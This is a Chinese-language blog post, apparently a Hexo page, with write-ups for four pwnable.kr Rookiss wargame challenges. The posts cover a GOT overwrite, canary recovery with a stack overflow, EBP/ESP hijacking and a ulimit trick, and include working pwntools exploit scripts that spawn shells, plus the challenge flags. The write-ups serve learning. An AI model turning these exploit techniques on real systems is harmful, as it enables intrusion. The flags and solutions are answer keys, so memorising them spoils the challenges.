@@ -1,0 +1,926 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="继续pwnable.kr的第二个难度——Rookiss 第一个难度在这里(有些题目的wp没写上去)：https://muirelle.com/2018/12/30/Pwnable-kr/ 题目链接: http://pwnable.kr/play.php">
+<meta name="keywords" content="pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnable.kr[Rookiss]">
+<meta property="og:url" content="http://yoursite.com/2019/02/02/pwnable-kr-Rookiss/index.html">
+<meta property="og:site_name" content="Muirelle的博客">
+<meta property="og:description" content="继续pwnable.kr的第二个难度——Rookiss 第一个难度在这里(有些题目的wp没写上去)：https://muirelle.com/2018/12/30/Pwnable-kr/ 题目链接: http://pwnable.kr/play.php">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/0CRn4Bd.png">
+<meta property="og:image" content="https://i.imgur.com/vn3S0Zv.png">
+<meta property="og:image" content="https://i.imgur.com/yVRMysR.png">
+<meta property="og:image" content="https://i.imgur.com/nunHzpJ.png">
+<meta property="og:image" content="https://i.imgur.com/MuFJVhD.png">
+<meta property="og:image" content="https://i.imgur.com/0viaAfQ.png">
+<meta property="og:image" content="https://i.imgur.com/VeHY7SR.png">
+<meta property="og:image" content="https://i.imgur.com/c4ECOdm.png">
+<meta property="og:image" content="https://i.imgur.com/aqWLhJp.png">
+<meta property="og:image" content="https://i.imgur.com/FNx8C4r.png">
+<meta property="og:image" content="https://i.imgur.com/VFPVbNk.png">
+<meta property="og:image" content="https://i.imgur.com/yz6zqos.png">
+<meta property="og:image" content="https://i.imgur.com/FWCFwrN.png">
+<meta property="og:image" content="https://i.imgur.com/6HIcjQn.png">
+<meta property="og:image" content="https://i.imgur.com/FyOG7Ko.png">
+<meta property="og:updated_time" content="2019-02-09T13:04:49.611Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pwnable.kr[Rookiss]">
+<meta name="twitter:description" content="继续pwnable.kr的第二个难度——Rookiss 第一个难度在这里(有些题目的wp没写上去)：https://muirelle.com/2018/12/30/Pwnable-kr/ 题目链接: http://pwnable.kr/play.php">
+<meta name="twitter:image" content="https://i.imgur.com/0CRn4Bd.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/02/02/pwnable-kr-Rookiss/"/>
+
+
+
+
+
+  <title>Pwnable.kr[Rookiss] | Muirelle的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Muirelle的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/02/pwnable-kr-Rookiss/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Muirelle">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Muirelle的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Pwnable.kr[Rookiss]</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-02T14:35:10+08:00">
+                2019-02-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/02/02/pwnable-kr-Rookiss/" class="leancloud_visitors" data-flag-title="Pwnable.kr[Rookiss]">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>继续pwnable.kr的第二个难度——Rookiss</p>
+<p>第一个难度在这里(有些题目的wp没写上去)：<a href="https://muirelle.com/2018/12/30/Pwnable-kr/" target="_blank" rel="noopener">https://muirelle.com/2018/12/30/Pwnable-kr/</a></p>
+<p>题目链接: <a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">http://pwnable.kr/play.php</a></p>
+<a id="more"></a>
+<h1 id="brain-fuck"><a href="#brain-fuck" class="headerlink" title="brain fuck"></a>brain fuck</h1><p>题目：</p>
+<p><strong>Download : <a href="http://pwnable.kr/bin/bf" target="_blank" rel="noopener">http://pwnable.kr/bin/bf</a></strong></p>
+<p><strong>Download : <a href="http://pwnable.kr/bin/bf_libc.so" target="_blank" rel="noopener">http://pwnable.kr/bin/bf_libc.so</a></strong></p>
+<p><strong>Running at : nc pwnable.kr 9001</strong></p>
+<p>现在题目不给源码了，越来越接近ctf的题目了。</p>
+<p>放进ida看，主要是两个函数，<code>main</code>和<code>do_brainfuck</code></p>
+<p><img src="https://i.imgur.com/0CRn4Bd.png" alt=""></p>
+<p><img src="https://i.imgur.com/vn3S0Zv.png" alt=""></p>
+<p><a href="https://zh.wikipedia.org/wiki/Brainfuck" target="_blank" rel="noopener">什么是brainfuck</a></p>
+<p>了解了bf语言后可以知道题目本身相当于一个缺少<code>[</code>和<code>]</code>功能的bf语言，用户通过输入字符控制指针移动和读写。</p>
+<p>看下指针一开始在什么位置</p>
+<p><img src="https://i.imgur.com/yVRMysR.png" alt=""><br>p是指针，tape是指针指向的位置，位于bss段。</p>
+<p>bss段距离堆和栈都太远了，<code>fgets</code>又限制了1024字节，所以不可能把指针移动到堆或栈上再操作了。</p>
+<p><img src="https://i.imgur.com/nunHzpJ.png" alt=""></p>
+<p>卡了半天，最后看wp才知道bss段附近不远就是got.plt段，可以直接修改plt表让原先的函数跳转到其他函数去。</p>
+<p>接下来的思路：</p>
+<p>把main函数的<code>memset</code>got.plt表跳转的地址覆盖成<code>gets</code>，<code>fgets</code>覆盖为<code>system</code>，最后把<code>putchar</code>覆盖成<code>main</code>。第二次进入<code>main</code>后，在执行<code>gets</code>时输入’<code>/bin/sh&#39;</code>，接着<code>system</code>就会调用该参数，拿到shell。</p>
+<p>接下来的操作：</p>
+<p>先将指针移动到got.plt段，打印出一个libc函数的地址后减去这个函数在libc中的偏移，就能得到libc的基址。用libc的基址加上<code>system</code>得到<code>system</code>的真实地址，同理，拿到<code>gets</code>的地址。最后按照思路写出shellcode。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">'./bf_libc.so'</span>)</span><br><span class="line">r = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9001</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (r.recvuntil(<span class="string">'except [ ]\n'</span>))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">shellcode += <span class="string">'&lt;'</span>*(<span class="number">0x0804A0A0</span><span class="number">-0x0804A010</span>)</span><br><span class="line">shellcode += <span class="string">'.&gt;'</span>*<span class="number">4</span></span><br><span class="line">shellcode += <span class="string">'&lt;'</span>*<span class="number">4</span> + <span class="string">',&gt;'</span>*<span class="number">4</span></span><br><span class="line">shellcode += <span class="string">'&lt;'</span>*<span class="number">4</span> + <span class="string">'&gt;'</span>*(<span class="number">0x0804A02C</span><span class="number">-0x0804A010</span>)</span><br><span class="line">shellcode += <span class="string">',&gt;'</span>*<span class="number">4</span></span><br><span class="line">shellcode += <span class="string">',&gt;'</span>*<span class="number">4</span></span><br><span class="line">shellcode += <span class="string">'.'</span></span><br><span class="line"></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">fgets_addr = r.recvn(<span class="number">4</span>)[::<span class="number">-1</span>].encode(<span class="string">'hex'</span>)</span><br><span class="line">libc_base = int(fgets_addr, <span class="number">16</span>) - libc.symbols[<span class="string">'fgets'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">gets_addr = libc_base + libc.symbols[<span class="string">'gets'</span>]</span><br><span class="line"></span><br><span class="line">r.send(p32(system_addr))</span><br><span class="line">r.send(p32(gets_addr))</span><br><span class="line">r.send(p32(<span class="number">0x8048671</span>))</span><br><span class="line">r.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag:<strong>BrainFuck? what a weird language..</strong></p>
+<h1 id="md5-calculator"><a href="#md5-calculator" class="headerlink" title="md5 calculator"></a>md5 calculator</h1><p>题目：</p>
+<p><strong>Download : <a href="http://pwnable.kr/bin/hash" target="_blank" rel="noopener">http://pwnable.kr/bin/hash</a></strong></p>
+<p><strong>Running at : nc pwnable.kr 9002</strong></p>
+<p><img src="https://i.imgur.com/MuFJVhD.png" alt=""><br>开了canary和NX</p>
+<p>进ida<br><img src="https://i.imgur.com/0viaAfQ.png" alt=""></p>
+<p>这个程序的流程是：</p>
+<p><code>my_hash</code>函数提供验证码(captcha)，输入验证码，验证成功后进入功能函数<code>process_hash</code>，该函数将用户输入的经过base64加密的密文解密之后再散列成md5发送给用户。</p>
+<p>先看看<code>my_hash</code></p>
+<p><img src="https://i.imgur.com/VeHY7SR.png" alt=""></p>
+<p>开始一直不知道这个是干嘛的，也没有搜到，后面看wp猜测就是插入栈中的canary。从图中看到v10位于ebp-0xc的位置。</p>
+<p><img src="https://i.imgur.com/c4ECOdm.png" alt=""><br>在最后验证canary值的时候是用的ebp+var_C(var_C==-0xc)也就是v10和canary初始值作比较的，所以进一步确定v10就是canary。</p>
+<p>可以看到canary的值参与了captcha的运算，也就是说如果我们能拿到生成随机数的种子就可以反推出canary，从而绕过这个保护。</p>
+<p>然而随机数种子就是通过<code>time(0)</code>得到的，为了避免运行脚本的时候系统时间和服务器时间不一致，把脚本放在服务器运行就可以了。</p>
+<p>光知道了绕过canary没有栈溢出还是白搭。去看看<code>process_hash</code>。</p>
+<p><img src="https://i.imgur.com/aqWLhJp.png" alt=""></p>
+<p>这里fgets接收的经base64编码后的字符串，最大长度为1024字节，而转换后的原字符串长度给了512(0x200)字节的空间。但是通过计算可以知道，1024字节的base64密文解码后的长度是768字节(看了wp后表示学到了ORZ)，所以存在栈溢出。</p>
+<p><img src="https://i.imgur.com/FNx8C4r.png" alt=""></p>
+<p>计算好偏移之后就可以写脚本了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = time(<span class="number">0</span>);</span><br><span class="line">    srand(t);</span><br><span class="line">    <span class="keyword">int</span> r[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i)</span><br><span class="line">        r[i] = rand();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> captcha = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>, captcha - r[<span class="number">4</span>] + r[<span class="number">6</span>] - r[<span class="number">7</span>] - r[<span class="number">2</span>] + r[<span class="number">3</span>] - r[<span class="number">1</span>] - r[<span class="number">5</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9002</span>)</span><br><span class="line"><span class="keyword">print</span> (r.recvuntil(<span class="string">'captcha : '</span>))</span><br><span class="line"></span><br><span class="line">captcha = r.recv().strip()</span><br><span class="line"><span class="keyword">print</span> (captcha)</span><br><span class="line">r.sendline(captcha)</span><br><span class="line">captcha = int(captcha)</span><br><span class="line"><span class="keyword">print</span> (r.recvuntil(<span class="string">'paste me!\n'</span>))</span><br><span class="line"></span><br><span class="line">cookie = int(os.popen(<span class="string">"./noxus %d"</span>%captcha).read())</span><br><span class="line"></span><br><span class="line">g_buf = <span class="number">0x804b0e0</span></span><br><span class="line">binsh_addr = (len(payload)+<span class="string">'a'</span>*<span class="number">4</span>)*<span class="number">3</span>/<span class="number">4</span>	<span class="comment">#payload的长度*0.75就是'binsh'在g_buf中的位置</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">512</span>			<span class="comment">#padding</span></span><br><span class="line">payload += p32(cookie)		<span class="comment">#canary</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0xc</span>			<span class="comment">#padding</span></span><br><span class="line">payload += p32(<span class="number">0x8048880</span>)	<span class="comment">#system地址</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">4</span>			<span class="comment">#原本此位置是system返回地址，用不到，所以padding。</span></span><br><span class="line">payload += p32(g_buf+(<span class="number">512</span>+<span class="number">4</span>+<span class="number">12</span>+<span class="number">4</span>+<span class="number">4</span>+<span class="number">4</span>)*<span class="number">4</span>/<span class="number">3</span>)	<span class="comment">#'binsh'位置在g_buf中，payload编码后长度要*4/3</span></span><br><span class="line"></span><br><span class="line">payload = b64e(payload) + <span class="string">'/bin/sh\0'</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>写好脚本后随便找一个之前的题目进服务器，然后</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ <span class="built_in">cd</span> /tmp/</span><br><span class="line">fd@ubuntu:/tmp$ vim noxus.c</span><br><span class="line">fd@ubuntu:/tmp$ gcc -o noxus noxus.c</span><br><span class="line">fd@ubuntu:/tmp$ vim demacia.py</span><br><span class="line">fd@ubuntu:/tmp$ python demacia.py</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/VFPVbNk.png" alt=""></p>
+<p>笔记：</p>
+<p>1、字符串经某种方式编码或解码后长度会发生改变，通常编码或解码后的长度是可计算的，若内存没有合理分配则可能导致栈溢出。</p>
+<p>2、可以利用题目中混杂canary的计算推出canary的值。</p>
+<p>3、不将/bin/sh放在栈上是因为无法通过base64解码出一个空字符(base64不可编码/解码空字符)，导致无法控制system参数。所以选择在bss段的g_buf上放置未加密的’/bin/sh’。</p>
+<h1 id="simple-login"><a href="#simple-login" class="headerlink" title="simple login"></a>simple login</h1><p>题目：</p>
+<p><strong>Download : <a href="http://pwnable.kr/bin/login" target="_blank" rel="noopener">http://pwnable.kr/bin/login</a></strong></p>
+<p><strong>Running at : nc pwnable.kr 9003</strong></p>
+<p>看到这题好多函数都和上一题一样，还以为又要栽了，结果比想象中简单。。。flag概括了整道题的考点hhh</p>
+<p>flag： <strong>control EBP, control ESP, control EIP, control the world~</strong></p>
+<p>进ida，main函数</p>
+<p><img src="https://i.imgur.com/yz6zqos.png" alt=""><br>把关键部分找出来，然后仔细审计，弄清楚流程</p>
+<p>从上图看出：程序从用户读取base64编码后的字符串，经<code>Base64Decode</code>解码后的字符串的长度放在<code>v6</code>，址放在<code>v4</code>，并且要求<code>v6</code>要小于等于12(0xc)。然后通过<code>memcpy</code>把解码后的字符串放在一个bss段的变量<code>input</code>中，接着，若<code>auth</code>返回值为1就调用<code>correct</code>从而拿到shell。</p>
+<p>所以进<code>auth</code>看看<br><img src="https://i.imgur.com/FWCFwrN.png" alt=""><br>通过控制main函数中v6值为12，则<code>auth</code>中a1为12，则在执行<code>memcpy</code>时就会将12字节的数据复制到只有4字节大小的v4上，又注意到v4在栈中的位置为<code>ebp-8h</code>，所以最后的四个字节会将ebp覆盖掉。</p>
+<p>控制了ebp之后，esp就好说了。</p>
+<p>虽然在这个函数返回时esp并不会被影响，但在下一个函数返回之前执行leave指令时，ebp的值就会赋给esp，从而间接控制esp。</p>
+<p><img src="https://i.imgur.com/6HIcjQn.png" alt=""><br>构造输入后的字符串经base63解码后是这个样子就行了。(红框内是溢出部分)system_addr不放在开头的原因是因为leave中还有一个pop ebp的操作，esp相应的会+4，所以system_addr往后放了4个字节。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9003</span>)</span><br><span class="line"><span class="keyword">print</span> (r.recvuntil(<span class="string">'Authenticate : '</span>))</span><br><span class="line">payload = b64e(<span class="string">'a'</span>*<span class="number">4</span>+p32(<span class="number">0x08049284</span>)+p32(<span class="number">0x0811eb40</span>))</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> (r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/FyOG7Ko.png" alt=""></p>
+<p>笔记：</p>
+<p>1、控制ebp可以间接控制esp，进而控制eip，从而劫持函数流。</p>
+<p>2、一开始本来打算esp指向栈中的system，但是无法成功调用，只有指向bss段的system才能成功调用。目前还不清楚原因。</p>
+<h1 id="otp"><a href="#otp" class="headerlink" title="otp"></a>otp</h1><p>题目：<strong>ssh <a href="mailto:otp@pwnable.kr" target="_blank" rel="noopener">otp@pwnable.kr</a> -p2222 (pw:guest)</strong></p>
+<p>想了半天，找不到溢出点，结果不是溢出。。。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> fname[<span class="number">128</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> otp[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"usage : ./otp [passcode]\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">	<span class="keyword">if</span>(fd==<span class="number">-1</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(read(fd, otp, <span class="number">16</span>)!=<span class="number">16</span>) <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	close(fd);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">sprintf</span>(fname, <span class="string">"/tmp/%llu"</span>, otp[<span class="number">0</span>]);</span><br><span class="line">	FILE* fp = fopen(fname, <span class="string">"w"</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp==<span class="literal">NULL</span>)&#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;</span><br><span class="line">	fwrite(&amp;otp[<span class="number">1</span>], <span class="number">8</span>, <span class="number">1</span>, fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"OTP generated.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> passcode=<span class="number">0</span>;</span><br><span class="line">	FILE* fp2 = fopen(fname, <span class="string">"r"</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp2==<span class="literal">NULL</span>)&#123; <span class="built_in">exit</span>(<span class="number">-1</span>); &#125;</span><br><span class="line">	fread(&amp;passcode, <span class="number">8</span>, <span class="number">1</span>, fp2);</span><br><span class="line">	fclose(fp2);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(strtoul(argv[<span class="number">1</span>], <span class="number">0</span>, <span class="number">16</span>) == passcode)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Congratz!\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"OTP mismatch\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unlink(fname);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>源码用urandom生成了16字节的随机数，前八字节作为一个文件名，后八字节作为这个文件的内容，如果用户输入和文件内容相同则拿到flag。</p>
+<p>解题的关键就是用<code>ulimit -f 0</code>命令将用户可创建文件的大小置零，于是源码中创建文件的语句得不到执行，最后读取文件内容就是空字符。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/user/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">subprocess.Popen([<span class="string">'/home/otp/otp'</span>, <span class="string">''</span>], stderr=subprocess.STDOUT)</span><br></pre></td></tr></table></figure>
+<h1 id=""><a href="#" class="headerlink" title="#"></a>#</h1>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
